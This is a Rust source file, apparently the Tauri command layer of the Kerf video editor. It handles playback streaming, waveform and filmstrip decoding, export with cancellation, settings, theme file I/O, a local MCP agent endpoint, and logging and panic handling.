static ACTIVE_PLAYBACK: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

/// The last id `stop_playback` was asked to cancel.
///
/// `ACTIVE_PLAYBACK` alone is not enough: a stop can reach the backend *before*
/// the start it was meant to cancel (the webview issues them as two independent
/// IPC calls, and the start goes through a dynamic import first). Such a stop
/// finds nothing to clear and the stream then starts with nobody left to end it
/// — an ffmpeg that plays on forever. Recording the id instead means the stream
/// notices at its very next frame, whichever order the two calls land in.
static STOPPED_PLAYBACK: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

/// Play the timeline from `start`, streaming composited frames to `on_frame`
/// until playback is stopped, superseded, or the timeline ends.
///
/// Scrubbing and the settled frame still go through `get_timeline_frame` — one
/// process per frame is right when you want *one* frame. Playback is the case
/// that can't work that way: a spawn-seek-decode-exit cycle per frame caps well
/// below frame rate, so this hands the whole span to a single long-lived ffmpeg
/// and pushes frames up as they render.
///
/// Resolves only when playback ends; the caller is not expected to await it.
#[tauri::command]
async fn start_playback(
    state: State<'_, AppState>,
    playback_id: u64,
    start: f64,
    fps: Option<f64>,
    on_frame: tauri::ipc::Channel<PlaybackFrame>,
) -> CmdResult<()> {
    use std::sync::atomic::Ordering;

    let shared = state.project.clone();
    ACTIVE_PLAYBACK.store(playback_id, Ordering::SeqCst);
    blocking(move || {
        // Resolve the inputs under the lock and drop the guard before streaming:
        // playback runs for as long as the user watches, and holding the shared
        // mutex for that would freeze every edit and the whole MCP server.
        let (timeline, assets) = lock_user(&shared).timeline_frame_inputs().map_err(|e| e.to_string())?;
        // Counted and logged below: whether frames reached the webview at all, and
        // how long the first one took, are the two facts that tell a stream that
        // never started from one whose frames the preview received and discarded.
        // Without them a black pane looks identical either way.
        let began = std::time::Instant::now();
        let mut frames: u64 = 0;
        let mut first_frame: Option<std::time::Duration> = None;
        let result = kerf_core::stream_preview(&timeline, &assets, start, fps.unwrap_or(24.0), &mut |f| {
            // Superseded by a newer playback, or explicitly stopped — including by
            // a stop that arrived before this stream even started.
            if ACTIVE_PLAYBACK.load(Ordering::SeqCst) != playback_id || STOPPED_PLAYBACK.load(Ordering::SeqCst) == playback_id {
                return false;
            }
            let b64 = base64::engine::general_purpose::STANDARD.encode(&f.jpeg);
            let sent = on_frame
                .send(PlaybackFrame {
                    time: f.time,
                    jpeg: format!("data:image/jpeg;base64,{b64}"),
                })
                .is_ok();
            if sent {
                frames += 1;
                first_frame.get_or_insert_with(|| began.elapsed());
            }
            sent
        });
        tracing::info!(
            playback_id,
            frames,
            first_frame_ms = first_frame.map(|d| d.as_millis() as u64),
            elapsed_ms = began.elapsed().as_millis() as u64,
            "playback stream ended"
        );
        // Running out of timeline, or being superseded or stopped, is not an
        // error; only a genuine ffmpeg failure on a stream someone is still
        // watching is reported — the preview would otherwise just go black.
        let current =
            ACTIVE_PLAYBACK.load(Ordering::SeqCst) == playback_id && STOPPED_PLAYBACK.load(Ordering::SeqCst) != playback_id;
        let _ = ACTIVE_PLAYBACK.compare_exchange(playback_id, 0, Ordering::SeqCst, Ordering::SeqCst);
        match result {
            Err(e) if current => {
                tracing::warn!(error = %e, "preview stream failed");
                Err(e.to_string())
            }
            Err(e) => {
                tracing::debug!(error = %e, "preview stream ended");
                Ok(())
            }
            Ok(_) => Ok(()),
        }
    })
    .await
}

/// Stop the playback stream with this id (pause, seek, or a timeline edit).
/// A stop for a stream that has already been superseded is a no-op.
#[tauri::command(async)]
fn stop_playback(playback_id: u64) {
    use std::sync::atomic::Ordering;
    STOPPED_PLAYBACK.store(playback_id, Ordering::SeqCst);
    let _ = ACTIVE_PLAYBACK.compare_exchange(playback_id, 0, Ordering::SeqCst, Ordering::SeqCst);
}

#[tauri::command]
async fn get_waveform(state: State<'_, AppState>, asset_id: String, buckets: usize) -> CmdResult<Vec<f32>> {
    let id = id(&asset_id)?;
    let shared = state.project.clone();
    blocking(move || {
        // Resolve under the lock, decode the whole audio stream with it released —
        // a long source takes seconds to bucket and must not stall other ops.
        let asset = lock_user(&shared).require_asset(id).map_err(|e| e.to_string())?;
        Project::decode_waveform(&asset, buckets).map_err(|e| e.to_string())
    })
    .await
}

/// `[start, end)` **source seconds** of an asset's audio as `buckets` min/max
/// peak pairs per channel — what the timeline draws a clip's waveform from.
/// The first call for a file decodes it into a cached peak pyramid; every later
/// window at any zoom is a slice read.
#[tauri::command]
async fn get_waveform_range(
    state: State<'_, AppState>,
    asset_id: String,
    start: f64,
    end: f64,
    buckets: usize,
) -> CmdResult<WaveformRange> {
    let id = id(&asset_id)?;
    let shared = state.project.clone();
    blocking(move || {
        // Resolve under the lock, read (and on a first call decode) with it
        // released — same shape as `get_waveform`.
        let asset = lock_user(&shared).require_asset(id).map_err(|e| e.to_string())?;
        Project::decode_waveform_range(&asset, start, end, buckets).map_err(|e| e.to_string())
    })
    .await
}

/// A [`Filmstrip`] as the webview receives it: the strip's own JSON (geometry
/// only — the pixels are `#[serde(skip)]` in core) with each sheet carrying its
/// JPEG as a base64 `data:` URL. `data:` rather than a `blob:` URL because the
/// CSP admits `data:` images and nothing else; the strip is at most ~2 MB of
/// JPEG, so the ~2.7 MB string is one IPC message, not a stream.
#[derive(Serialize)]
struct FilmstripPayload {
    interval: f64,
    frame_width: u32,
    frame_height: u32,
    frames: u32,
    columns: u32,
    sheets: Vec<FilmstripSheetPayload>,
}

/// One sheet of a [`FilmstripPayload`]: the core sheet's own fields (flattened,
/// so a field added there reaches the webview without touching the adapter)
/// plus its pixels.
#[derive(Serialize)]
struct FilmstripSheetPayload {
    #[serde(flatten)]
    sheet: FilmstripSheet,
    /// `data:image/jpeg;base64,…` — `width` x `height` pixels, `count` thumbnails
    /// side by side from the left.
    data_url: String,
}

/// Transport only: the geometry is copied across untouched and the JPEG bytes
/// are base64'd the way `get_frame`'s are.
fn filmstrip_payload(strip: &Filmstrip) -> FilmstripPayload {
    FilmstripPayload {
        interval: strip.interval,
        frame_width: strip.frame_width,
        frame_height: strip.frame_height,
        frames: strip.frames,
        columns: strip.columns,
        sheets: strip
            .sheets
            .iter()
            .map(|sheet| FilmstripSheetPayload {
                data_url: format!(
                    "data:image/jpeg;base64,{}",
                    base64::engine::general_purpose::STANDARD.encode(&sheet.jpeg)
                ),
                sheet: sheet.clone(),
            })
            .collect(),
    }
}

/// An asset's **filmstrip** — the thumbnails the timeline draws a video clip
/// from: one sampled strip per asset, cached on disk by core, of which any
/// source window is a few thumbnails (`Filmstrip::frame_at` / `locate`, mirrored
/// by the webview's `filmstrip-geometry.ts`). The first call for an asset decodes
/// it; later ones are a cache read. Rejects for an asset with no video stream.
#[tauri::command]
async fn get_filmstrip(state: State<'_, AppState>, asset_id: String) -> CmdResult<FilmstripPayload> {
    let id = id(&asset_id)?;
    let shared = state.project.clone();
    blocking(move || {
        // Only the asset record under the lock — a database read — then drop the
        // guard before anything touches the media: `decode_filmstrip` finds the
        // asset's ready proxy (which can run an ffprobe) and, the first time, reads
        // the whole file, and the timeline asks for every clip's strip at once.
        // Same shape as `get_waveform_range`.
        let asset = lock_user(&shared).require_asset(id).map_err(|e| e.to_string())?;
        let strip = Project::decode_filmstrip(&asset).map_err(|e| e.to_string())?;
        Ok(filmstrip_payload(&strip))
    })
    .await
}

/// A window of an asset's audio as raw mono s16le PCM for the preview's Web
/// Audio playback. Returns raw bytes rather than JSON — a minute of 32 kHz
/// audio is ~3.8 MB, which a JSON number array would balloon ~5×.
#[tauri::command]
async fn get_audio(
    state: State<'_, AppState>,
    asset_id: String,
    start: f64,
    duration: f64,
    sample_rate: Option<u32>,
    clip_id: Option<String>,
) -> CmdResult<tauri::ipc::Response> {
    let clip_id = clip_id.as_deref().map(id).transpose()?;
    let id = id(&asset_id)?;
    let shared = state.project.clone();
    let pcm = blocking(move || {
        // Resolve the asset under the lock, then drop the guard before the decode —
        // same reasoning as `get_frame`. `clip_id` names the clip this window is
        // being fetched for, so its effect chain is baked into the decode and the
        // monitor plays what the export will render, not the dry source.
        let (asset, effects) = {
            let project = lock_user(&shared);
            let asset = project.require_asset(id).map_err(|e| e.to_string())?;
            let effects = match clip_id {
                Some(clip_id) => project
                    .timeline()
                    .ok()
                    .and_then(|tl| tl.clip(clip_id).map(|c| c.audio.clone()))
                    .unwrap_or_default(),
                None => Vec::new(),
            };
            (asset, effects)
        };
        let rate = sample_rate.unwrap_or(32_000).clamp(8_000, 48_000);
        Project::decode_audio_pcm(&asset, start, duration, rate, &effects).map_err(|e| e.to_string())
    })
    .await?;
    Ok(tauri::ipc::Response::new(pcm))
}

#[tauri::command]
async fn get_energy(state: State<'_, AppState>, asset_id: String, buckets: usize) -> CmdResult<Vec<f32>> {
    let id = id(&asset_id)?;
    let shared = state.project.clone();
    blocking(move || {
        // Same lock-free decode shape as `get_waveform`.
        let asset = lock_user(&shared).require_asset(id).map_err(|e| e.to_string())?;
        Project::decode_energy(&asset, buckets).map_err(|e| e.to_string())
    })
    .await
}

// ---- agent task queue (mutations return the refreshed queue) ---------------

#[tauri::command(async)]
fn list_tasks(state: State<'_, AppState>) -> CmdResult<Vec<Task>> {
    state.project().list_tasks().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn add_task(state: State<'_, AppState>, prompt: String) -> CmdResult<Task> {
    state.project().add_task(&prompt).map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn resolve_task(state: State<'_, AppState>, task_id: String) -> CmdResult<Vec<Task>> {
    let id = id(&task_id)?;
    let project = state.project();
    project.resolve_task(id).map_err(|e| e.to_string())?;
    project.list_tasks().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn remove_task(state: State<'_, AppState>, task_id: String) -> CmdResult<Vec<Task>> {
    let id = id(&task_id)?;
    let project = state.project();
    project.remove_task(id).map_err(|e| e.to_string())?;
    project.list_tasks().map_err(|e| e.to_string())
}

// ---- export ----------------------------------------------------------------

/// The hardware (GPU) video encoders this machine's ffmpeg can actually use —
/// verified once per process with a tiny test encode. The export dialog merges
/// them into its codec choices; empty means software encoders only.
#[tauri::command]
async fn hw_encoders() -> CmdResult<Vec<String>> {
    // First call probes by spawning ffmpeg, so keep it off the async workers.
    blocking(|| Ok(kerf_core::hw_encoders().to_vec())).await
}

pub(crate) fn file_mtime(path: &std::path::Path) -> Option<std::time::SystemTime> {
    std::fs::metadata(path).and_then(|m| m.modified()).ok()
}

/// Remove what a failed render left at `path` — but only if this run touched
/// it. A failure before ffmpeg opened the output (bad options, an empty cut)
/// must not delete the earlier export still sitting at that path.
pub(crate) fn discard_partial(path: &std::path::Path, before: Option<std::time::SystemTime>) {
    if file_mtime(path) != before {
        let _ = std::fs::remove_file(path);
    }
}

#[tauri::command]
async fn export_timeline(
    app: AppHandle,
    state: State<'_, AppState>,
    output_path: String,
    options: ExportOptions,
) -> CmdResult<String> {
    require_local_output_path(&output_path)?;
    // Snapshot the timeline + assets under the lock, then release it before the
    // (seconds-to-minutes) ffmpeg render. Otherwise the export would hold the
    // shared Project mutex for its whole duration and freeze every other GUI
    // command and the MCP agent until it finished.
    let (timeline, assets) = {
        let project = state.project();
        (
            project.timeline().map_err(|e| e.to_string())?,
            project.list_assets().map_err(|e| e.to_string())?,
        )
    };

    // Fresh cancel flag for this run; `cancel_export` flips it from another thread.
    let cancel = state.export_cancel.clone();
    cancel.store(false, Ordering::SeqCst);

    blocking(move || {
        // Stream `export-progress` events ({ fraction, elapsed_secs, eta_secs }) so
        // the UI can show a bar + ETA. ffmpeg emits ~2/sec, no extra throttle needed.
        let mut on_progress = |p: kerf_core::ExportProgress| {
            let _ = app.emit("export-progress", p);
        };
        let before = file_mtime(std::path::Path::new(&output_path));
        let status = match kerf_core::render_with_progress(
            &timeline,
            &assets,
            std::path::Path::new(&output_path),
            &options,
            &mut on_progress,
            &|| cancel.load(Ordering::SeqCst),
        ) {
            Ok(status) => status,
            Err(e) => {
                discard_partial(std::path::Path::new(&output_path), before);
                return Err(e.to_string());
            }
        };

        match status {
            kerf_core::RenderStatus::Completed => Ok(output_path),
            kerf_core::RenderStatus::Cancelled => {
                // Drop the half-written file so a cancelled export leaves no debris.
                let _ = std::fs::remove_file(&output_path);
                Err("export cancelled".to_string())
            }
        }
    })
    .await
}

/// Render the cut once per delivery frame — one file per shape beside
/// `output_path`, named by shape (`cut-9x16.mp4`). With `smart_crop`, every
/// shot is framed for every shape first (one revision, reused by later
/// exports); the project frame's own crop is never touched. Streams the same
/// `export-progress` event as a single export, with `variant` / `total` added.
#[tauri::command]
async fn export_variants(
    app: AppHandle,
    state: State<'_, AppState>,
    output_path: String,
    formats: Vec<Delivery>,
    smart_crop: bool,
    options: ExportOptions,
) -> CmdResult<Vec<String>> {
    if formats.is_empty() {
        return Err("pick at least one delivery frame".to_string());
    }
    require_local_output_path(&output_path)?;
    let base = std::path::PathBuf::from(&output_path);
    let mut deliveries: Vec<Delivery> = Vec::new();
    for d in formats {
        let d = Delivery::new(d.width, d.height, d.fit);
        if !deliveries.contains(&d) {
            deliveries.push(d);
        }
    }
    let variants: Vec<kerf_core::ExportVariant> = deliveries
        .iter()
        .map(|d| kerf_core::ExportVariant::beside(&base, *d))
        .collect();
    let shared = state.project.clone();
    let cancel = state.export_cancel.clone();
    cancel.store(false, Ordering::SeqCst);

    blocking(move || {
        // Frame first — plan under the lock, sample without it, apply under it
        // again — then snapshot and render with the lock released, like a
        // single export.
        if smart_crop {
            let plan = lock_user(&shared).framing_inputs(&deliveries).map_err(|e| e.to_string())?;
            if !plan.jobs.is_empty() {
                let framings = Project::sample_framings(&plan).map_err(|e| e.to_string())?;
                let framed = lock_user(&shared).apply_framings(&framings).map_err(|e| e.to_string())?;
                if framed > 0 {
                    let _ = app.emit("project-changed", ());
                }
            }
        }
        let (timeline, assets) = {
            let project = lock_user(&shared);
            (
                project.timeline().map_err(|e| e.to_string())?,
                project.list_assets().map_err(|e| e.to_string())?,
            )
        };
        // One variant at a time through `render_variants`, so a failure names
        // the file in flight: that one is removed, the finished ones stay.
        let total = variants.len();
        let started = std::time::Instant::now();
        for (i, variant) in variants.iter().enumerate() {
            let mut on_progress = |p: kerf_core::VariantProgress| {
                let fraction = (i as f64 + p.fraction.clamp(0.0, 1.0)) / total as f64;
                let elapsed_secs = started.elapsed().as_secs_f64();
                let _ = app.emit(
                    "export-progress",
                    kerf_core::VariantProgress {
                        variant: i,
                        total,
                        fraction,
                        elapsed_secs,
                        eta_secs: (fraction > 0.0).then(|| elapsed_secs / fraction - elapsed_secs),
                    },
                );
            };
            let before = file_mtime(&variant.output);
            match kerf_core::render_variants(
                &timeline,
                &assets,
                std::slice::from_ref(variant),
                &options,
                &mut on_progress,
                &|| cancel.load(Ordering::SeqCst),
            ) {
                Ok((kerf_core::RenderStatus::Completed, _)) => {}
                // `render_variants` already removed the cancelled file.
                Ok((kerf_core::RenderStatus::Cancelled, _)) => return Err("export cancelled".to_string()),
                Err(e) => {
                    discard_partial(&variant.output, before);
                    return Err(e.to_string());
                }
            }
        }
        Ok(variants.iter().map(|v| v.output.to_string_lossy().into_owned()).collect())
    })
    .await
}

/// Write the composited frame at `time_secs` to `output_path` as a **cover
/// image** — full delivery resolution, decoded from the original media rather
/// than a preview proxy. `format` follows the file extension when omitted.
#[tauri::command]
async fn export_cover(
    state: State<'_, AppState>,
    time_secs: f64,
    output_path: String,
    format: Option<kerf_core::ImageFormat>,
) -> CmdResult<String> {
    require_local_output_path(&output_path)?;
    let shared = state.project.clone();
    blocking(move || {
        // Same shape as every heavy command: resolve under the lock, render
        // without it. A 4K still is a real decode.
        let (timeline, assets) = lock_user(&shared).export_still_inputs().map_err(|e| e.to_string())?;
        let path = Project::render_still(&timeline, &assets, time_secs, &output_path, format).map_err(|e| e.to_string())?;
        Ok(path.to_string_lossy().into_owned())
    })
    .await
}

/// Frame every shot for the delivery frame instead of centring it blindly —
/// samples where each clip's content sits and writes the crop that keeps it.
/// One clip when `clip_id` is given, otherwise every clip on an unlocked video
/// track. The result is an ordinary transform crop, so the inspector's sliders
/// still have the last word.
#[tauri::command]
async fn smart_crop(state: State<'_, AppState>, clip_id: Option<String>) -> CmdResult<Timeline> {
    let clip = clip_id.as_deref().map(id).transpose()?;
    let shared = state.project.clone();
    blocking(move || {
        // The usual shape for a heavy command: plan under the lock, decode
        // without it (one short ffmpeg pass per clip), apply under it again.
        let plan = lock_user(&shared).smart_crop_inputs(clip).map_err(|e| e.to_string())?;
        let crops = Project::sample_smart_crops(&plan).map_err(|e| e.to_string())?;
        let project = lock_user(&shared);
        project.apply_smart_crops(&crops).map_err(|e| e.to_string())?;
        project.timeline().map_err(|e| e.to_string())
    })
    .await
}

/// Every publishing target Kerf knows about, with its frame and length limits.
#[tauri::command(async)]
fn platform_targets() -> Vec<kerf_core::PlatformTarget> {
    kerf_core::PLATFORM_TARGETS.to_vec()
}

/// How ready the current cut is for each target — what would be rejected, what
/// would be accepted and then under-distributed, and what would just be better.
#[tauri::command(async)]
fn platform_check(
    state: State<'_, AppState>,
    width: Option<u32>,
    height: Option<u32>,
) -> CmdResult<Vec<kerf_core::DeliveryCheck>> {
    // The export dialog can resize away from the project frame; when it does it
    // passes the frame it is actually about to render, so the verdict is about
    // the file that will exist rather than the one the project defaults to.
    let frame = width.zip(height);
    state.project().platform_check(frame).map_err(|e| e.to_string())
}

/// Show a file in the OS file manager. The last step of an export: the render
/// finished somewhere, and "somewhere" is not much use on its own.
#[tauri::command(async)]
fn reveal_path(app: AppHandle, path: String) -> CmdResult<()> {
    use tauri_plugin_opener::OpenerExt;
    // Open the containing folder, not the file — opening the file would launch
    // a player, which is not what "show me where it went" means.
    let target = std::path::Path::new(&path)
        .parent()
        .filter(|p| !p.as_os_str().is_empty())
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| std::path::PathBuf::from(&path));
    app.opener()
        .open_path(target.to_string_lossy().into_owned(), None::<&str>)
        .map_err(|e| e.to_string())
}

/// The error an abandoned analysis pass returns. The webview matches on it to
/// tell "the user stopped this" apart from "this broke".
const ANALYSIS_CANCELLED: &str = "analysis cancelled";

/// Request cancellation of the in-flight analysis pass (if any). The running
/// [`analyze_asset`] observes the flag between steps — and, during
/// transcription, about once a second — then gives up and caches nothing.
#[tauri::command(async)]
fn cancel_analysis(state: State<'_, AppState>) {
    state.analysis_cancel.store(true, Ordering::SeqCst);
}

/// Request cancellation of the in-flight export (if any). The running
/// [`export_timeline`] observes the flag on its next progress poll, stops
/// ffmpeg, and returns the `"export cancelled"` error.
#[tauri::command(async)]
fn cancel_export(state: State<'_, AppState>) {
    state.export_cancel.store(true, Ordering::SeqCst);
}

// ---- agent connection (MCP endpoint) ---------------------------------------

/// The local MCP endpoint URL a connected LLM points at (e.g.
/// `http://127.0.0.1:7777/mcp`), honoring the `KERF_MCP_ADDR` override. The
/// agent panel surfaces this so the user knows how to connect their agent.
#[tauri::command(async)]
fn mcp_endpoint() -> String {
    mcp::endpoint_url()
}

/// Where the endpoint is, and how long ago an agent last used it.
///
/// A streamable-HTTP client holds no connection between calls, so there is no
/// "is it plugged in" to report — `last_seen_secs` is `None` until something
/// has spoken to the endpoint at all, and the panel decides from its age
/// whether to call that connected. Anything else would be the green dot the
/// panel used to show whether or not an agent existed.
#[derive(Serialize)]
struct AgentStatus {
    endpoint: String,
    last_seen_secs: Option<i64>,
    /// Set when the server could not start (the port is taken), so the panel
    /// can say that instead of showing an endpoint nothing answers on.
    error: Option<String>,
}

#[tauri::command(async)]
fn agent_status() -> AgentStatus {
    AgentStatus {
        endpoint: mcp::endpoint_url(),
        last_seen_secs: mcp::agent_last_seen_secs(),
        error: mcp::server_error(),
    }
}

// ---- app settings ----------------------------------------------------------

/// The current preferences, resolved against the engine (see
/// [`settings::SettingsView`]).
#[tauri::command(async)]
fn get_settings(app: AppHandle) -> settings::SettingsView {
    settings::SettingsView::current(&settings::load(&app))
}

/// Merge a patch — only the fields that changed (`{workspaces}`, `{theme}`,
/// `{cpu_percent}`, …) — into the stored preferences and put them into force.
/// Patching rather than replacing means two call sites writing at once cannot
/// overwrite each other's field with a stale copy. Returns the resolved view, so
/// the dialog can show the clamped percentage and the cores it works out to
/// without a second round-trip.
#[tauri::command(async)]
fn set_settings(
    app: AppHandle,
    gpu: State<'_, Arc<gpu_preview::GpuPreview>>,
    patch: serde_json::Value,
) -> CmdResult<settings::SettingsView> {
    let stored = settings::update(&app, &patch)?;
    if patch.get("gpu_preview").is_some() {
        if stored.gpu_preview {
            // Turning it on is a flag: the next frame the page asks for must already see it.
            gpu.set_enabled(true);
        } else {
            // Turning it off hides the surface and frees the device, which may wait for a frame
            // in flight: not on this thread.
            let gpu = gpu.inner().clone();
            std::thread::spawn(move || gpu.set_enabled(false));
        }
    }
    Ok(settings::SettingsView::current(&stored))
}

// ---- theme files -----------------------------------------------------------

/// The largest file `read_text_file` will read: a theme is a few KB, and the
/// path comes from a file picker the user could point at anything.
const TEXT_FILE_MAX: u64 = 1 << 20;

/// These two commands take a path the webview chose, so they only touch `.json`
/// files — a theme — and never anything that is not a plain file.
fn require_json_path(path: &str) -> CmdResult<()> {
    let is_json = std::path::Path::new(path)
        .extension()
        .is_some_and(|e| e.eq_ignore_ascii_case("json"));
    if is_json {
        Ok(())
    } else {
        Err(format!("{path} is not a .json file"))
    }
}

/// A small text file picked by the user (a theme to import).
#[tauri::command]
async fn read_text_file(path: String) -> CmdResult<String> {
    blocking(move || {
        require_json_path(&path)?;
        let meta = std::fs::metadata(&path).map_err(|e| e.to_string())?;
        if !meta.is_file() {
            return Err(format!("{path} is not a regular file"));
        }
        if meta.len() > TEXT_FILE_MAX {
            return Err(format!("{path} is larger than 1 MiB — not a theme file"));
        }
        std::fs::read_to_string(&path).map_err(|e| e.to_string())
    })
    .await
}

/// Write a text file to a path the user chose (a theme to export).
#[tauri::command]
async fn write_text_file(path: String, contents: String) -> CmdResult<String> {
    blocking(move || {
        require_json_path(&path)?;
        if contents.len() as u64 > TEXT_FILE_MAX {
            return Err("contents are larger than 1 MiB — not a theme file".to_string());
        }
        if std::fs::metadata(&path).is_ok_and(|m| !m.is_file()) {
            return Err(format!("{path} is not a regular file"));
        }
        std::fs::write(&path, contents).map_err(|e| e.to_string())?;
        Ok(path)
    })
    .await
}

// ---- diagnostics (logs) ----------------------------------------------------

/// Where the logfiles live: `<app data dir>/logs`. The one place this is
/// decided, so `init_logging`, `log_dir` and `reveal_logs` cannot disagree.
fn log_dir_path(app: &AppHandle) -> tauri::Result<std::path::PathBuf> {
    app.path().app_data_dir().map(|dir| dir.join("logs"))
}

#[tauri::command(async)]
fn log_dir(app: AppHandle) -> CmdResult<String> {
    log_dir_path(&app)
        .map(|p| p.to_string_lossy().into_owned())
        .map_err(|e| e.to_string())
}

/// Open the log directory in the OS file manager so users can attach the file.
#[tauri::command(async)]
fn reveal_logs(app: AppHandle) -> CmdResult<()> {
    use tauri_plugin_opener::OpenerExt;
    let dir = log_dir_path(&app).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    app.opener()
        .open_path(dir.to_string_lossy().into_owned(), None::<&str>)
        .map_err(|e| e.to_string())
}

/// The longest message the webview may write to the log; the rest is cut so a
/// runaway loop (or an error carrying a whole payload) cannot fill the disk.
const FRONTEND_LOG_MAX: usize = 8 * 1024;
const FRONTEND_CONTEXT_MAX: usize = 512;
/// Webview lines let through per second; the rest are counted and reported.
const FRONTEND_LOG_PER_SEC: u32 = 30;

fn truncate_log(s: &str, max: usize) -> String {
    if s.len() <= max {
        return s.to_string();
    }
    let mut end = max;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}… [truncated {} bytes]", &s[..end], s.len() - end)
}

/// A fixed one-second window: `admit` says whether this line may be written and,
/// when a new window opens, how many the last one turned away.
#[derive(Default)]
struct LogBudget {
    window: u64,
    used: u32,
    dropped: u32,
}

impl LogBudget {
    fn admit(&mut self, now_ms: u64) -> (bool, u32) {
        let window = now_ms / 1000;
        let mut dropped = 0;
        if window != self.window {
            dropped = std::mem::take(&mut self.dropped);
            self.window = window;
            self.used = 0;
        }
        if self.used < FRONTEND_LOG_PER_SEC {
            self.used += 1;
            (true, dropped)
        } else {
            self.dropped += 1;
            (false, dropped)
        }
    }
}

/// Write a line from the webview — a failed command, an error toast, an
/// unhandled rejection — to the logfile, marked with the `webview` target.
#[tauri::command(async)]
fn log_frontend(level: String, message: String, context: Option<String>) {
    static BUDGET: Mutex<Option<LogBudget>> = Mutex::new(None);
    let now_ms = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_millis() as u64);
    let (allowed, dropped) = BUDGET
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get_or_insert_with(LogBudget::default)
        .admit(now_ms);
    if dropped > 0 {
        tracing::warn!(target: "webview", dropped, "webview log lines dropped (rate limit)");
    }
    if !allowed {
        return;
    }
    let message = truncate_log(&message, FRONTEND_LOG_MAX);
    let context = truncate_log(context.as_deref().unwrap_or(""), FRONTEND_CONTEXT_MAX);
    match level.as_str() {
        "error" => tracing::error!(target: "webview", context = %context, "{message}"),
        "warn" | "warning" => tracing::warn!(target: "webview", context = %context, "{message}"),
        _ => tracing::info!(target: "webview", context = %context, "{message}"),
    }
}

/// Packaged builds ship `ffmpeg`/`ffprobe` next to the executable as Tauri
/// `externalBin` sidecars (see `tauri.conf.json`'s `bundle.externalBin`, injected
/// for Windows where there is no system FFmpeg). Point the CLI engine at them via
/// the `KERF_FFMPEG`/`KERF_FFPROBE` overrides it already honors. We only set a var
/// when the user hasn't (an explicit override wins) and the bundled binary is
/// actually present, so dev builds — which have no sidecar — transparently fall
/// back to a bare `ffmpeg`/`ffprobe` PATH lookup.
fn use_bundled_ffmpeg() {
    let Ok(exe) = std::env::current_exe() else { return };
    let Some(dir) = exe.parent() else { return };
    for (var, name) in [("KERF_FFMPEG", "ffmpeg"), ("KERF_FFPROBE", "ffprobe")] {
        if std::env::var_os(var).is_some() {
            continue;
        }
        let path = dir.join(format!("{name}{}", std::env::consts::EXE_SUFFIX));
        if path.is_file() {
            std::env::set_var(var, &path);
            tracing::info!(%var, path = %path.display(), "using bundled FFmpeg binary");
        }
    }
}

/// The daily-rolling `kerf.<date>.log` in `dir` (the last 14 days are kept).
fn file_appender(
    dir: &std::path::Path,
) -> Result<tracing_appender::rolling::RollingFileAppender, tracing_appender::rolling::InitError> {
    tracing_appender::rolling::Builder::new()
        .rotation(tracing_appender::rolling::Rotation::DAILY)
        .filename_prefix("kerf")
        .filename_suffix("log")
        .max_log_files(14)
        .build(dir)
}

/// The logfile layer. The appender is its writer **directly**: each event is one
/// `write` straight to the file, so a line is with the OS the moment it is
/// logged. It used to sit behind `tracing_appender::non_blocking`, whose worker
/// thread owns a queue — and a queue is what a crash takes with it. A panic that
/// aborts, a `process::exit`, or a segfault in a native library (FFmpeg and ONNX
/// Runtime both run in this process) never reaches a guard's `Drop`, so the
/// lines nearest the crash, the ones a bug report needs, were the ones lost.
/// Logging here is a few dozen lines per session, none of them in a hot loop, so
/// the one syscall each costs nothing worth a queue.
fn file_layer<S>(appender: tracing_appender::rolling::RollingFileAppender) -> impl tracing_subscriber::Layer<S>
where
    S: tracing::Subscriber + for<'a> tracing_subscriber::registry::LookupSpan<'a>,
{
    tracing_subscriber::fmt::layer().with_ansi(false).with_writer(appender)
}

/// Install the global tracing subscriber: always to stdout, and — when the
/// log directory (`<app data dir>/logs`) is writable — to a daily-rolling
/// `kerf.<date>.log` there so users hitting an issue can attach it.
/// Level is `info` by default; override with `RUST_LOG` (e.g. `RUST_LOG=debug`).
fn init_logging(app: &AppHandle) {
    use tracing_subscriber::prelude::*;

    let filter =
        tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));
    let stdout = tracing_subscriber::fmt::layer().with_writer(std::io::stdout);

    let file = log_dir_path(app).ok().and_then(|dir| {
        std::fs::create_dir_all(&dir).ok()?;
        Some((file_layer(file_appender(&dir).ok()?), dir))
    });

    match file {
        Some((layer, dir)) => {
            tracing_subscriber::registry().with(filter).with(stdout).with(layer).init();
            tracing::info!(dir = %dir.display(), "logging to file");
        }
        None => {
            tracing_subscriber::registry().with(filter).with(stdout).init();
            tracing::warn!("file logging unavailable; logging to stdout only");
        }
    }
}

/// Where a panic happened and what it said, for its log line.
fn panic_summary(location: Option<&std::panic::Location<'_>>, payload: &(dyn std::any::Any + Send)) -> (String, String) {
    let location = location.map(|l| format!("{}:{}", l.file(), l.line())).unwrap_or_default();
    let message = payload
        .downcast_ref::<&str>()
        .map(|s| s.to_string())
        .or_else(|| payload.downcast_ref::<String>().cloned())
        .unwrap_or_else(|| "panic".to_string());
    (location, message)
}

/// One panic as a log record. The logfile writer is synchronous (`file_layer`),
/// so this is on disk when it returns — the process may be about to die.
fn log_panic(location: &str, message: &str, backtrace: &dyn std::fmt::Display) {
    tracing::error!(location = %location, "panic: {message}\n{backtrace}");
}

/// Route panics through tracing so they land in the logfile, then run the
/// default hook (which still prints the backtrace to stderr).
fn install_panic_hook() {
    let default = std::panic::take_hook();
    std::panic::set_hook(Box::new(move |info| {
        let (location, message) = panic_summary(info.location(), info.payload());
        // Captured regardless of RUST_BACKTRACE: a user's panic has no env var set,
        // and the logfile is the only copy. Release builds keep their symbol
        // table (`strip = "debuginfo"`), so the frames have function names.
        let backtrace = std::backtrace::Backtrace::force_capture();
        log_panic(&location, &message, &backtrace);
        default(info);
    }));
}

/// Emitted to the webview when a second launch carried a `.kerf` path. The
/// frontend owns the "replace the open project?" question, so it does the open.
const OPEN_PROJECT_EVENT: &str = "open-project-file";

/// The `.kerf` path in a launch's arguments, resolved against that launch's
/// working directory (a second launch's relative path is relative to *its* cwd,
